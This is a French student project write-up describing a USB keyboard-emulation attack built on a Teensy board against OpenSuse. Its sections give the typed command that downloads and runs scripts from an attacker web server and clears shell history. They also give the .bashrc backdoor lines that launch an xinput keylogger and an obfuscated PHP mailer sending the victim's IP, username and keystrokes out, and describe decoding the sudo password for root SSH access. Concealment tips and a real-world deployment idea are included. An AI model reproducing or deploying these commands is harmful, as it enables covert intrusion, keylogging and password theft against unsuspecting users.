
                                               ==[ESL - Projet G0]==

                     |=-----------------------------------------------------------------------=|
                     |=-------------------=[ Ghost Writer Teensy Eploit ]=--------------------=|
                     |=------------------=[ pouyet_j - krier_g - ferrer_y ]=------------------=|
                     |=-----------------------------------------------------------------------=|

Sommaire :
----------

I.   Introduction

II.  Prérequis
       1. Teensy
       2. Serveur web
       3. Repo git

III. Réalisation
       1. Ghost writer
       2. Backdoor
       3. Mailer
       4. Decoder

VI.  Conclusion



I. Introduction :
-----------------

C'est en remarquant qu'avec un peu de social engineering nous arrivions à connecter une clef usb sur une machine,
sans que l'utilisateur ne se soucis de rien, que nous avons eu l'idée de réaliser une attaque sur un port usb.
L'originalité de notre projet étant d'utiliser une clef usb afin d'émuler un clavier dans le but de véroler
l'ordinateur victime.
Pour cela une clef usb nommé USB Rubber Ducky existe déjà. Cette clef usb exécute une suite de commandes en les tappant
automatiquement sans que l'utilisateur n'interagisse.
Ce vecteur d'attaque permet de réaliser des actions sur un ordinateur lorsque l'on a accès à une machine non verrouillée.
Dès lors, nous avons décidé d'acheter le matèriel nécessaire pour reproduire ce type de clef usb afin de mettre en place
une attaque aboutissant à l'optention d'un shell root, sur la machine victime, pour un budget faible (~20 euros).


II. Prérequis :
---------------

L'attaque décrite dans cet article nécessite l'utilisation d'une Teensy, d'un serveur web et des codes sources 
disponible sur http://github.com/kashimsax/TeensyExploit.git.

     1. La Teensy :
     --------------

     La Teensy est tout simplement un micro-controleur doté d'un port USB (cf: https://www.pjrc.com/teensy/).
     Lors du branchement, grâce à des bibliothèques, la Teensy possède la particularité d'émuler le protocole
     de connexion de certains périphériques USB (souris, clavier...).
     Pour les besoins de notre projet, nous avons choisis de faire passer notre Teensy pour un clavier.
     Cela nous permet ensuite de simuler l'écriture d'un texte par l'utilisateur de façon automatisé.

     2. Le serveur web :
     -------------------

     Au cours de ce projet est apparu la nécessité de récupérer des scripts à distance.
     Pour ce faire, nous avons utilisé un serveur web gratuit. De cette manière nous pouvons télécharger nos
     fichiers grâce à la commande `wget`.
     De plus, cela nous permet de mettre en place un client mail pour recevoir les informations des victimes.
     Nous ne traîterons pas la question de l'anonymat dans cet article, celui-ci étant fait pour démontrer
     la possibilité d'obtenir un shell root au travers de la Teensy.
     Elle reste cependant une part importante de l'attaque si vous souhaitez la réaliser en condition réelle.

     3. Repo git :
     -------------

     Sur le repo git se trouve l'ensemble des sources du projet.
     Le dossier TeensySoft contient la librairie émulant le clavier grâce à la Teensy, mais également les lignes
     de commande à executer lors de la connexion du périphérique (ghostkeyboard.c).
     Vous trouverez également les répertoires shAppend et phpMailer contenant respectivement un script shell 
     initialisant une backdoor ainsi qu'un script php pour l'envoie des données.
     Pour finir, le répertoire LogDecoder contient un programme C++ de conversion de données utilisateurs en texte 
     compréhensible.
     

III. Réalisation :
------------------

       Le projet se décompose en quatre grandes parties allant du social engineering jusqu'à la récupération du mot
       de passe root.

       1. Ghost writer :
       -----------------

       Cette partie concerne uniquement la Teensy. Suite au branchement du périphérique USB sur la machine cible, celui
       va se mettre à exécuter une suite d'instructions.
       
       Tout d'abord il faut savoir que la libraire keyboard de la Teensy nous permet de ne faire que deux actions.
       La première est la simulation de l'appuie d'une touche :
       
              usb_keyboard_press(KEY_A, 0); // Ecris la lettre A
       
       Et la seconde est de simuler un appuie long sur certaines touches :
       
              keyboard_modifier_keys = KEY_CTRL; // Appui long sur la touche CTRL
              usb_keyboard_send();                      
       
       En combinant ces deux fonctionnalitées, nous avons pu ouvrir un terminal grâce à la combinaisons
       des touches (CTRL + ALT + T) et ainsi d'avoir le focus sur celui-ci.
       Dans un second temps, nous convertissons une chaine de caractères en une suite d'évenements clavier
       représentant en réalité une suite de commandes shell :
       
              static const char hack_me[] =
                     "wget -q [URL_SERVEUR]/.profilebash [URL_SERVEUR]/a;chmod 755 a;./a;rm a;history -c;exit";
       
       Une fois executé, cette suite de commande téléchargera les scripts 'shAppend/a' et 'phpMailer/.profilebash', 
       exécutera le script 'a', le supprimera et finira par fermer le terminal.
       A partir de ce moment, la machine cible est verolé.

       Vous aurez certainement remarqué que la nommage des scripts (a et .profilebash) est peu explicite.
       Les raisons sont simples. Dans le premier cas, la raison est que tous les caractères 
       tappés par la teensy seront affichés à l'écran. Il est donc nécessaire de condenser 
       au maximum ces instructions afin de diminuer le temps de frappe et ainsi dissimuler au mieux l'attaque.
       Puisque la ligne de commande contient le nom des scripts, réduire sa taille nous a permis de réduire
       le temps d'affichage du terminal.
       Dans le second cas, .profilebash, nous avons choisis ce nom pour tenter de le dissimuler au mieux à
       l'utilisateur. En effet, contrairement au script 'a', '.profilebash' ne sera pas supprimé.
       
       2. Backdoor :
       -------------

       Cette partie concerne l'exécution du script 'a' signifiant 'append'. Une fois ce script téléchargé par
       la Teensy il sera executé puis supprimé.
       En effet, ce script a pour unique tâche d'ajouter une suite d'instruction dans le .bashrc de la victime.
       Le fichier .bashrc éxécutera désormais les instructions suivantes:
       
              ifconfig >> ~/.kernel_config                                          # Récupération de l'ip dans le fichier .kernel_config.
              php ~/.profilebash ~/.kernel_config $USER                             # Envoi des données de la victime sur notre serveur (cf: Mailer).
              rm ~/.kernel_config                                                   
              clear
              FD=`xinput --list | grep -F "Set 2 keyboard" | grep -oE "[0-9]{2}"`   # Récupération de l'id du prériphérique clavier.
              xinput test $FD >> ~/.kernel_config &                                 # Lancement d'un keylogger système.
       
       La commande xinput permet de lire les évenements sur un device précis. "xinput --list" nous permet de trouver l'id
       du clavier, et "xinput test [ID]" de lire les évenements clavier que nous redirigeons dans notre fichier
       ".kernel_config", situé dans le home de la victime. Nous utilisons donc xinput comme un keylogger.

       3. Mailer :
       -----------
       
       Notre mailer est le fichier ".profilebash". En plus d'un nom n'évoquant pas une menace,
       nous avons obfusqué son code source pour laisser le moins de doute possible à la victime.
       Le Mailer consiste en un simple code PHP qui nous envoie l'ip de la victime, son nom d'utilisateur
       ainsi que toutes ses frappes sur un terminal.
       La finalité étant d'obtenir son mot de passe root qui, combiné à l'ip, nous permettra une connexion
       ssh en root sur la machine cible.
       
       4. Decoder :
       ------------

       Cette dernière partie concerne le traitement des évènements clavier de la victime précédement reçus.
       Puisque nous utilisons le "keylogger" xinput, nous recevons des données sous cette forme :
       
              key press   54 
              key press   24 
              key press   28 
              
       Il ne reste plus qu'à convertir ces nombres en texte compréhensible. Pour ce faire, nous avons développé un
       outil C++ faisant la conversion. Ce programme cherchera le mot clé "sudo" et ainsi nous afficher en clair
       le mot de passe root.

IV. Conclusion :
----------------

Dans cet exemple nous avons pu démontrer qu'il était possible d'obtenir un shell root distant à une machine cible
sans exploiter d'autre vulnérabilité que la confiance utilisateur. Nous pourrions expérimenter en conditions réels cette
attaque en dissimulant la Teensy dans une souris et prétexter vouloir tester son bon fonctionnement sur l'ordinateur
victime.
D'autre part, il nous apparu que la diversification des périphériques USB fait apparaître un nouveau vecteur d'attaque
sans réelle possibilitée de protection mise à part la méfiance de l'utilisateur.
Nous avons uniquement ciblé l'OS OpenSuse puisqu'il nous a été plus aisé de tester,
cet OS étant largement utilisé dans notre entourage. Il serait cependant réalisable d'adapter cette attaque
sur d'autres OS, la logique restant similaire.
Pour finir il est important d'assimiler le fait que la teensy est détecté en temps que clavier,
ce qui permet par conséquent de bypasser bon nombre de sécurités.
Un clavier ne représentant pas une menace pour les outils d'analyse USB.




